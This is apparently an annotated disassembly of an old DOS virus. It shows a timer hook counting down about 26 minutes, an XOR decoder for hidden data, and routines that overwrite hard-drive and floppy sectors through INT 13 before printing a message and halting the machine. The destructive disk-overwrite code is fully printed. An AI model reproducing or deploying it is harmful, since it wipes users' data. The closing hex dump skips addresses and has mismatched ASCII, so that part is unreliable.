TOP:0B87  7503           JNZ    0B8C
TOP:0B89  E99FF7         JMP    032B            ; Jump to original RESET vector
TOP:0B8C  E82EF8       * CALL   03BD
TOP:0B8F  7205           JC     0B96
TOP:0B91  E2F9           LOOP   0B8C
TOP:0B93  E995F7         JMP    032B            ; Jump to original RESET vector

TOP:0B96  1F           * POP    DS              ; Measure 26 minutes
TOP:0B97  2EA1720B       MOV    AX,CS:[0B72]
TOP:0B9B  48             DEC    AX
TOP:0B9C  2EA3720B     * MOV    CS:[0B72],AX
TOP:0BA0  7407           JZ     0BA9
TOP:0BA2  5A             POP    DX
TOP:0BA3  59             POP    CX
TOP:0BA4  5B             POP    BX
TOP:0BA5  58             POP    AX
TOP:0BA6  9D             POPF
TOP:0BA7  EBC3           JMP    0B6C            ; Jump to original INT 1C

TOP:0BA9  B88070       * MOV    AX,7080         ; New value for measuring
                                                ;  (26 minutes)
TOP:0BAC  2EC606B30A01   MOV    CS:[0AB3],01    ; Load 1 to DMF2
TOP:0BB2  40             INC    AX
TOP:0BB3  EBE7           JMP    0B9C

TOP:0BB5  BB470C       * MOV    BX,0C47         ; Decode data (text & figure)
TOP:0BB8  B96801         MOV    CX,0168
TOP:0BBB  2E8A07         MOV    AL,CS:[BX]
TOP:0BBE  3C20           CMP    AL,20           ; If already decoded
TOP:0BC0  740B           JZ     0BCD
TOP:0BC2  2E8A07         MOV    AL,CS:[BX]
TOP:0BC5  3445           XOR    AL,45
TOP:0BC7  2E8807         MOV    CS:[BX],AL
TOP:0BCA  43             INC    BX
TOP:0BCB  E2F5           LOOP   0BC2

TOP:0BCD  0E           * PUSH   CS
TOP:0BCE  1F             POP    DS
TOP:0BCF  2E803EB20A01   CMP    CS:[0AB2],01    ; Check DMF1
TOP:0BD5  7450           JZ     0C27

                                                ; Fill 0x24 * 0x80 (9 sector)
                                                ;  bytes with laughing figure
TOP:0BD7  BE2F0D         MOV    SI,0D2F         ; SI=One figure address
TOP:0BDA  BF000F         MOV    DI,0F00
TOP:0BDD  B98000         MOV    CX,0080
TOP:0BE0  B224           MOV    DL,24
TOP:0BE2  0E             PUSH   CS
TOP:0BE3  07             POP    ES
TOP:0BE4  0E             PUSH   CS
TOP:0BE5  1F             POP    DS
TOP:0BE6  FC             CLD
TOP:0BE7  F3A4         * REP    MOVSB           ; Copy 0x80 bytes
TOP:0BE9  81EE8000       SUB    SI,0080
TOP:0BED  B98000         MOV    CX,0080
TOP:0BF0  FECA           DEC    DL
TOP:0BF2  75F3           JNZ    0BE7            ; Repeat it

TOP:0BF4  BA8001         MOV    DX,0180         ; Write figures to the
TOP:0BF7  B80903         MOV    AX,0309         ; 1st har drive.
TOP:0BFA  B90200         MOV    CX,0002         ; Head=1, from the 2nd sect.
TOP:0BFD  BB000F         MOV    BX,0F00
TOP:0C00  9C             PUSHF
TOP:0C01  0E             PUSH   CS
TOP:0C02  E88EF5         CALL   0193            ; Call original INT13

TOP:0C05  BA8002         MOV    DX,0280         ; Write figures to the
TOP:0C08  B80903         MOV    AX,0309         ; 1st har drive.
TOP:0C0B  B90200         MOV    CX,0002         ; Head=2, from the 2nd sect.
TOP:0C0E  BB000F         MOV    BX,0F00
TOP:0C11  9C             PUSHF
TOP:0C12  0E             PUSH   CS
TOP:0C13  E87DF5         CALL   0193            ; Call original INT13

TOP:0C16  BA0000         MOV    DX,0000         ; Write figures to the
TOP:0C19  B80903         MOV    AX,0309         ; floppy
TOP:0C1C  B90100         MOV    CX,0001         ; Head=0, from the 1st sect.
TOP:0C1F  BB000F         MOV    BX,0F00
TOP:0C22  9C             PUSHF
TOP:0C23  0E             PUSH   CS
TOP:0C24  E86CF5         CALL   0193            ; Call original INT13

TOP:0C27  BE470C       * MOV    SI,0C47         ; Load address of text
TOP:0C2A  B002           MOV    AL,02           ; Clear Screen
TOP:0C2C  B400           MOV    AH,00
TOP:0C2E  CD10           INT    10

TOP:0C30  2E8A04         MOV    AL,CS:[SI]      ; Write text
TOP:0C33  3C00           CMP    AL,00
TOP:0C35  740C           JZ     0C43
TOP:0C37  B40E           MOV    AH,0E
TOP:0C39  BB0000         MOV    BX,0000
TOP:0C3C  56             PUSH   SI
TOP:0C3D  CD10           INT    10
TOP:0C3F  5E             POP    SI
TOP:0C40  46             INC    SI
TOP:0C41  EBED           JMP    0C30

TOP:0C43  FA           * CLI                    ; Halt processor
TOP:0C44  F4             HLT
TOP:0C45  EBFC           JMP    0C43

                                        ; Coded data area, XORed by 0x45

TOP:0C47                           65 65 65 0D 24 2D 24 69           eee.$-$i
TOP:0C4F   33 E4 37 30 36 65 33 24 2B 65 24 65 22 C7 35 27   3.706e3$+e$e".5'
TOP:0C5F   20 2B 64 64 48 4F 00 3F 65 20 22 3C 65 20 21 21    +ddHO.?e "<6?
TOP:0CAF   37 C4 20 2B 65 31 D1 29 31 D1 22 20 31 D1 65 48   7. +e1.)1." 1.eH
TOP:0CBF   4F 00 3F 31 65 24 65 2B 20 33 C7 31 65 2A 2B 2B   O.?1e$e+ 3.1e*++
TOP:0CCF   24 2B 65 2E 24 35 31 24 69 65 2D 2A 22 3C 65 23   $+e.$51$ie-*"

